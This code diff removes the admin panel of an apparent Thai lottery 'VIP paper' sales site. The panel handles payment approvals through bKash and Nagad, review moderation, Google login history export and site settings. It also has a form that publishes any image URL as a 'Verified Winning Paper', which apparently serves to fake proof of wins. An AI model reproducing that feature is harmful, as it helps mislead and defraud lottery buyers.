-                          <label className="text-xs text-gray-300 font-bold">BDT Price</label>
-                          <input 
-                            type="number" 
-                            value={bdtPrice} 
-                            onChange={e => setBdtPrice(Number(e.target.value))} 
-                            className="w-full bg-black/40 border border-amber-500/30 rounded-xl px-4 py-2.5 text-xs text-white"
-                          />
-                        </div>
-                      </div>
-
-                      <div className="space-y-2">
-                        <label className="text-xs text-gray-300 font-bold">Draw Date Text</label>
-                        <input 
-                          type="text" 
-                          value={drawDateText} 
-                          onChange={e => setDrawDateText(e.target.value)} 
-                          className="w-full bg-black/40 border border-amber-500/30 rounded-xl px-4 py-2.5 text-xs text-white"
-                        />
-                      </div>
-
-                      <div className="space-y-2">
-                        <label className="text-xs text-gray-300 font-bold">Countdown Target Date/Time</label>
-                        <input 
-                          type="datetime-local" 
-                          value={countdownTarget.slice(0, 16)} 
-                          onChange={e => setCountdownTarget(e.target.value + ':00')} 
-                          className="w-full bg-black/40 border border-amber-500/30 rounded-xl px-4 py-2.5 text-xs text-white"
-                        />
-                      </div>
-
-                      <button 
-                        onClick={() => alert('Upcoming settings updated successfully!')}
-                        className="bg-amber-500 text-black font-bold px-6 py-2.5 rounded-xl text-xs"
-                      >
-                        Save Changes
-                      </button>
-                    </div>
-                  )}
-
-                  {activeAdminTab === 'payments' && (
-                    <div className="space-y-6">
-                      <h3 className="text-xl font-bold text-amber-300">Pending Payment Verifications</h3>
-                      <div className="space-y-3">
-                        {pendingPayments.map(p => (
-                          <div key={p.id} className="bg-black/40 border border-amber-500/30 rounded-2xl p-4 flex flex-col md:flex-row items-center justify-between gap-4">
-                            <div className="space-y-1">
-                              <p className="font-bold text-white text-sm">{p.name} <span className="text-xs text-gray-400">({p.email})</span></p>
-                              <p className="text-xs text-amber-300">Method: <strong>{p.method}</strong> | Last 4 Digits: <strong className="font-mono text-white text-sm bg-amber-500/20 px-2 py-0.5 rounded">{p.last4}</strong></p>
-                              <p className="text-[11px] text-gray-400">Amount: {p.amountSar} SAR | ৳ {p.amountBdt} BDT • {p.time}</p>
-                            </div>
-
-                            <div className="flex items-center gap-2">
-                              {p.status === 'Pending' ? (
-                                <>
-                                  <button 
-                                    onClick={() => {
-                                      setPendingPayments(pendingPayments.map(item => item.id === p.id ? {...item, status: 'Approved'} : item));
-                                      setIsUnlocked(true);
-                                      alert('Payment approved! VIP paper unlocked for user.');
-                                    }}
-                                    className="bg-emerald-600 hover:bg-emerald-500 text-white font-bold px-4 py-2 rounded-xl text-xs flex items-center gap-1"
-                                  >
-                                    <CheckCircle size={14} /> Approve
-                                  </button>
-                                  <button 
-                                    onClick={() => {
-                                      setPendingPayments(pendingPayments.map(item => item.id === p.id ? {...item, status: 'Rejected'} : item));
-                                      alert('Payment rejected.');
-                                    }}
-                                    className="bg-red-600 hover:bg-red-500 text-white font-bold px-4 py-2 rounded-xl text-xs"
-                                  >
-                                    Reject
-                                  </button>
-                                </>
-                              ) : (
-                                <span className={`font-bold text-xs px-3 py-1 rounded-full ${p.status === 'Approved' ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40' : 'bg-red-500/20 text-red-400 border border-red-500/40'}`}>
-                                  {p.status}
-                                </span>
-                              )}
-                            </div>
-                          </div>
-                        ))}
-                      </div>
-                    </div>
-                  )}
-
-                  {activeAdminTab === 'past' && (
-                    <div className="space-y-6">
-                      <h3 className="text-xl font-bold text-amber-300">Manage Past Winning Papers Archive</h3>
-                      
-                      <div className="bg-black/40 border border-amber-500/30 rounded-2xl p-4 space-y-3 max-w-xl">
-                        <h4 className="font-bold text-white text-sm">+ Upload New Win Proof</h4>
-                        <input 
-                          type="text" 
-                          id="newPastDate" 
-                          placeholder="Draw Date (e.g. 01 December 2026)" 
-                          className="w-full bg-black/40 border border-amber-500/30 rounded-xl px-4 py-2 text-xs text-white"
-                        />
-                        <input 
-                          type="text" 
-                          id="newPastImg" 
-                          placeholder="Image URL" 
-                          className="w-full bg-black/40 border border-amber-500/30 rounded-xl px-4 py-2 text-xs text-white"
-                        />
-                        <div className="grid grid-cols-2 gap-2">
-                          <input type="text" id="newPast3up" placeholder="3UP (e.g. 654)" className="bg-black/40 border border-amber-500/30 rounded-xl px-4 py-2 text-xs text-white" />
-                          <input type="text" id="newPastDown" placeholder="DOWN (e.g. 82)" className="bg-black/40 border border-amber-500/30 rounded-xl px-4 py-2 text-xs text-white" />
-                        </div>
-                        <button 
-                          onClick={() => {
-                            const date = document.getElementById('newPastDate').value;
-                            const image = document.getElementById('newPastImg').value;
-                            const up3 = document.getElementById('newPast3up').value;
-                            const down = document.getElementById('newPastDown').value;
-                            if(!date || !image) {
-                              alert('Please fill date and image URL');
-                              return;
-                            }
-                            const newItem = { id: Date.now(), date, image, up3: up3 || '---', down: down || '--', caption: 'Verified Winning Paper' };
-                            setPastPapers([newItem, ...pastPapers]);
-                            alert('Win proof published successfully!');
-                          }}
-                          className="bg-amber-500 text-black font-bold px-4 py-2 rounded-xl text-xs"
-                        >
-                          Publish Win Proof
-                        </button>
-                      </div>
-
-                      <div className="space-y-3">
-                        {pastPapers.map(p => (
-                          <div key={p.id} className="bg-black/40 border border-amber-500/30 rounded-xl p-3 flex items-center justify-between">
-                            <div className="flex items-center gap-3">
-                              <img src={p.image} alt="" className="w-12 h-16 object-cover rounded" />
-                              <div>
-                                <p className="font-bold text-white text-xs">{p.date}</p>
-                                <p className="text-[11px] text-amber-300">3UP: {p.up3} | DOWN: {p.down}</p>
-                              </div>
-                            </div>
-                            <button 
-                              onClick={() => setPastPapers(pastPapers.filter(item => item.id !== p.id))}
-                              className="text-red-400 hover:text-red-300 text-xs font-bold"
-                            >
-                              Delete
-                            </button>
-                          </div>
-                        ))}
-                      </div>
-                    </div>
-                  )}
-
-                  {activeAdminTab === 'reviews' && (
-                    <div className="space-y-6">
-                      <h3 className="text-xl font-bold text-amber-300">Moderate Customer Reviews</h3>
-                      <div className="space-y-3">
-                        {reviews.map(r => (
-                          <div key={r.id} className="bg-black/40 border border-amber-500/30 rounded-2xl p-4 flex items-center justify-between">
-                            <div className="space-y-1">
-                              <p className="font-bold text-white text-sm">{r.name} <span className="text-xs text-amber-400">({r.rating} Stars)</span></p>
-                              <p className="text-xs text-gray-300">"{r.comment}"</p>
-                            </div>
-                            <div className="flex items-center gap-2">
-                              {r.status === 'Pending' ? (
-                                <button 
-                                  onClick={() => setReviews(reviews.map(item => item.id === r.id ? {...item, status: 'Approved'} : item))}
-                                  className="bg-emerald-600 text-white font-bold px-3 py-1.5 rounded-xl text-xs"
-                                >
-                                  Approve
-                                </button>
-                              ) : (
-                                <button 
-                                  onClick={() => setReviews(reviews.map(item => item.id === r.id ? {...item, status: 'Pending'} : item))}
-                                  className="bg-yellow-600 text-black font-bold px-3 py-1.5 rounded-xl text-xs"
-                                >
-                                  Hide
-                                </button>
-                              )}
-                            </div>
-                          </div>
-                        ))}
-                      </div>
-                    </div>
-                  )}
-
-                  {activeAdminTab === 'logins' && (
-                    <div className="space-y-6">
-                      <div className="flex items-center justify-between">
-                        <h3 className="text-xl font-bold text-amber-300">Google Login History Records</h3>
-                        <button 
-                          onClick={exportLoginHistoryCsv}
-                          className="bg-amber-500 text-black font-bold px-4 py-2 rounded-xl text-xs flex items-center gap-1.5"
-                        >
-                          <Download size={14} /> Download CSV
-                        </button>
-                      </div>
-
-                      <div className="bg-black/40 border border-amber-500/30 rounded-2xl overflow-hidden">
-                        <table className="w-full text-left text-xs">
-                          <thead className="bg-[#062C22] text-amber-300 border-b border-amber-500/30">
-                            <tr>
-                              <th className="p-3">Name</th>
-                              <th className="p-3">Email</th>
-                              <th className="p-3">Timestamp</th>
-                            </tr>
-                          </thead>
-                          <tbody className="divide-y divide-gray-800">
-                            {loginHistory.map((item, idx) => (
-                              <tr key={idx}>
-                                <td className="p-3 font-bold text-white">{item.name}</td>
-                                <td className="p-3 text-gray-300">{item.email}</td>
-                                <td className="p-3 text-amber-400 font-mono">{item.time}</td>
-                              </tr>
-                            ))}
-                          </tbody>
-                        </table>
-                      </div>
-                    </div>
-                  )}
-
-                  {activeAdminTab === 'settings' && (
-                    <div className="space-y-6 max-w-xl">
-                      <h3 className="text-xl font-bold text-amber-300">Settings, Logos & Contact Numbers</h3>
-                      
-                      <div className="space-y-2">
-                        <label className="text-xs text-gray-300 font-bold">Brand Title</label>
-                        <input type="text" value={brandTitle} onChange={e => setBrandTitle(e.target.value)} className="w-full bg-black/40 border border-amber-500/30 rounded-xl px-4 py-2 text-xs text-white" />
-                      </div>
-
-                      <div className="space-y-2">
-                        <label className="text-xs text-gray-300 font-bold">Logo URL (Thailand Emblem)</label>
-                        <input type="text" value={logoUrl} onChange={e => setLogoUrl(e.target.value)} className="w-full bg-black/40 border border-amber-500/30 rounded-xl px-4 py-2 text-xs text-white" />
-                      </div>
-
-                      <div className="space-y-2">
-                        <label className="text-xs text-gray-300 font-bold">Partner Name</label>
-                        <input type="text" value={partnerName} onChange={e => setPartnerName(e.target.value)} className="w-full bg-black/40 border border-amber-500/30 rounded-xl px-4 py-2 text-xs text-white" />
-                      </div>
-
-                      <div className="space-y-2">
-                        <label className="text-xs text-gray-300 font-bold">Partner Profile Picture URL</label>
-                        <input type="text" value={partnerAvatar} onChange={e => setPartnerAvatar(e.target.value)} className="w-full bg-black/40 border border-amber-500/30 rounded-xl px-4 py-2 text-xs text-white" />
-                      </div>
-
-                      <div className="grid grid-cols-2 gap-4">
-                        <div className="space-y-2">
-                          <label className="text-xs text-gray-300 font-bold">bKash Number</label>
-                          <input type="text" value={bkashNumber} onChange={e => setBkashNumber(e.target.value)} className="w-full bg-black/40 border border-amber-500/30 rounded-xl px-4 py-2 text-xs text-white" />
-                        </div>
-                        <div className="space-y-2">
-                          <label className="text-xs text-gray-300 font-bold">Nagad Number</label>
-                          <input type="text" value={nagadNumber} onChange={e => setNagadNumber(e.target.value)} className="w-full bg-black/40 border border-amber-500/30 rounded-xl px-4 py-2 text-xs text-white" />
-                        </div>
-                      </div>
-
-                      <div className="space-y-2">
-                        <label className="text-xs text-gray-300 font-bold">Imo Helpline Number</label>
-                        <input type="text" value={imoNumber} onChange={e => setImoNumber(e.target.value)} className="w-full bg-black/40 border border-amber-500/30 rounded-xl px-4 py-2 text-xs text-white" />
-                      </div>
-
-                      <div className="space-y-2">
-                        <label className="text-xs text-gray-300 font-bold">Notice Bar Text (Bengali)</label>
-                        <textarea rows="2" value={noticeText} onChange={e => setNoticeText(e.target.value)} className="w-full bg-black/40 border border-amber-500/30 rounded-xl px-4 py-2 text-xs text-white" />
-                      </div>
-
-                      <button onClick={() => alert('Settings saved successfully!')} className="bg-amber-500 text-black font-bold px-6 py-2.5 rounded-xl text-xs">
-                        Save Settings
-                      </button>
-                    </div>
-                  )}
-
-                </div>
-              </div>
-            )}
           </div>
         </div>
       )}
